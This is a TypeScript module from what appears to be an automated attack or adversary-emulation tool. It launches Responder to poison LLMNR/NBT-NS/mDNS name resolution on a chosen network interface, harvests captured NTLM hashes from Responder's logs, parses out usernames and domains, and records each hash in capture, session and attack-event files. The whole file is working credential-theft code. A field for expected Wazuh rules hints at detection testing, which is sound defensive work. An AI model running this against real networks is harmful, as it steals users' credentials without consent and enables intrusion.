// Manages a Responder process for passive NTLM hash capture via LLMNR/NBT-NS/mDNS poisoning

import { spawn, type ChildProcess } from 'node:child_process';
import {
  appendFileSync,
  existsSync,
  mkdirSync,
  readdirSync,
  readFileSync,
  writeFileSync,
} from 'node:fs';
import { join } from 'node:path';
import type { AttackEvent } from '../types/index.js';
import { processManager } from './process-manager.js';

const RESPONDER_LOG_DIR = '/usr/share/responder/logs';
const POLL_INTERVAL_MS = 5_000;

// NTLMv2 format: username::DOMAIN:challenge:NTHash:NTHashResponse
const NTLMV2_RE = /^([^:]+)::([^:]+):[0-9a-fA-F]+:[0-9a-fA-F]+:[0-9a-fA-F]+$/;

export class ResponderManager {
  private proc: ChildProcess | null = null;
  private logDir: string;
  private captureFile: string;
  private seen: Set<string> = new Set();
  private interval: ReturnType<typeof setInterval> | null = null;

  constructor(logDir: string) {
    this.logDir = logDir;
    this.captureFile = join(logDir, 'responder_captures.txt');
  }

  start(networkInterface: string = 'eth0'): void {
    if (this.isRunning()) {
      console.warn('[responder-manager] Already running -- ignoring start()');
      return;
    }

    let child: ChildProcess;
    try {
      child = spawn('responder', ['-I', networkInterface, '-wrf', '--lm'], {
        stdio: ['ignore', 'pipe', 'pipe'],
      });
    } catch (err: unknown) {
      const code = (err as NodeJS.ErrnoException).code;
      if (code === 'ENOENT') {
        console.warn('[responder-manager] responder not found -- passive capture disabled');
        return;
      }
      throw err;
    }

    child.on('error', (err: NodeJS.ErrnoException) => {
      if (err.code === 'ENOENT') {
        console.warn('[responder-manager] responder not found -- passive capture disabled');
        this.proc = null;
      } else {
        console.error('[responder-manager] Process error:', err.message);
      }
    });

    child.on('exit', (code) => {
      console.log(`[responder-manager] Process exited with code ${String(code)}`);
      this.proc = null;
    });

    this.proc = child;
    processManager.register(child);

    console.log(`[responder-manager] Started on interface ${networkInterface}`);

    // Seed seen set with any hashes already in the log dir so we don't re-emit on restart
    this.seedExisting();

    this.interval = setInterval(() => {
      this.pollResponderLogs();
    }, POLL_INTERVAL_MS);
  }

  stop(): void {
    if (this.interval !== null) {
      clearInterval(this.interval);
      this.interval = null;
    }

    if (this.proc !== null) {
      try {
        this.proc.kill('SIGTERM');
      } catch {
        // Already dead
      }
      this.proc = null;
    }
  }

  private seedExisting(): void {
    if (!existsSync(RESPONDER_LOG_DIR)) return;

    const ntlmFiles = this.getNtlmLogFiles();
    for (const filePath of ntlmFiles) {
      try {
        const lines = readFileSync(filePath, 'utf-8').split('\n');
        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed) this.seen.add(trimmed);
        }
      } catch {
        // File may be unreadable -- skip
      }
    }
  }

  private getNtlmLogFiles(): string[] {
    if (!existsSync(RESPONDER_LOG_DIR)) return [];
    try {
      return readdirSync(RESPONDER_LOG_DIR)
        .filter((name) => name.includes('NTLM') && name.endsWith('.txt'))
        .map((name) => join(RESPONDER_LOG_DIR, name));
    } catch {
      return [];
    }
  }

  private pollResponderLogs(): void {
    const ntlmFiles = this.getNtlmLogFiles();
    for (const filePath of ntlmFiles) {
      try {
        const lines = readFileSync(filePath, 'utf-8').split('\n');
        for (const line of lines) {
          const trimmed = line.trim();
          if (!trimmed || this.seen.has(trimmed)) continue;
          this.seen.add(trimmed);
          this.onCapture(trimmed);
        }
      } catch {
        // File may vanish between listing and reading -- skip
      }
    }
  }

  private onCapture(hashLine: string): void {
    const timestamp = new Date().toISOString();
    console.log(`[responder-manager] Captured NTLM hash: ${hashLine}`);

    // Append to capture file
    const captureDir = this.logDir;
    if (!existsSync(captureDir)) mkdirSync(captureDir, { recursive: true });

    if (!existsSync(this.captureFile)) {
      writeFileSync(this.captureFile, '');
    }
    appendFileSync(this.captureFile, hashLine + '\n');

    // Parse username/domain from NTLMv2 hash line
    const match = NTLMV2_RE.exec(hashLine);
    const username = match?.[1] ?? 'unknown';
    const domain = match?.[2] ?? 'unknown';

    // Append to session memory
    const memoryDir = join(this.logDir, 'memory');
    if (!existsSync(memoryDir)) mkdirSync(memoryDir, { recursive: true });
    const sessionPath = join(memoryDir, 'session.md');
    appendFileSync(
      sessionPath,
      `- [${timestamp}] Responder captured NTLM: ${hashLine}\n`,
    );

    // Log to attacks.jsonl
    const attacksPath = join(this.logDir, 'attacks.jsonl');
    const event: AttackEvent = {
      timestamp,
      phase: 'credential-capture',
      technique: 'T1557.001',
      techniqueName: 'LLMNR/NBT-NS Poisoning and SMB Relay',
      target: {
        ip: 'N/A',
        user: `${domain}\\${username}`,
      },
      sourceIp: 'localhost',
      tool: 'responder',
      result: 'success',
      wazuhRuleExpected: '',
      details: `NTLM hash captured via Responder: ${hashLine}`,
    };
    appendFileSync(attacksPath, JSON.stringify(event) + '\n');
  }

  getCaptures(): string[] {
    if (!existsSync(this.captureFile)) return [];
    try {
      return readFileSync(this.captureFile, 'utf-8')
        .split('\n')
        .filter((line) => line.trim().length > 0);
    } catch {
      return [];
    }
  }

  isRunning(): boolean {
    return this.proc !== null && this.proc.exitCode === null;
  }
}

export const responderManager = new ResponderManager(
  process.env['WRAITH_LOG_DIR'] ?? './attack-logs',
);
